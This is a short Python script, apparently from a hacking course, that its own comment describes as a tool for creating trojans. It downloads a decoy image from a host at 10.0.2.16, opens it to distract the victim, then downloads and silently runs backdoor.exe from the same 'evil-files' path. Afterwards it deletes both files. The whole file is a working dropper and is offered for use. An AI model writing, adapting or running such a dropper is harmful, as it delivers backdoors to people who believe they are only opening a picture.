#!/usr/bin/env python

# this program we use for creating trojans  -  combining our malicious file with normal file.
#use request module version 2.5.1
#uninstall previous one as it is having some issues
#wine /root/.wine/drive_c/Python27/python.exe -m pip uninstall requests
#wine /root/.wine/drive_c/Python27/python.exe -m pip install requests==2.5.1


import requests, subprocess, smtplib, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]        #getting last element for file name
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)
    print(get_response.status_code)
    print(get_response.headers.get("Content-Type"))


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

#download normal file eg. car.jpg
download("http://10.0.2.16/evil-files/car.jpg")
subprocess.Popen("car.jpg", shell=True)

#download evil file eg. backdoor.exe - convert file from py to exe using pyinstaller
download("http://10.0.2.16/evil-files/backdoor.exe")
subprocess.call("backdoor.exe", shell=True)


os.remove("car.jpg")
os.remove("backdoor.exe")

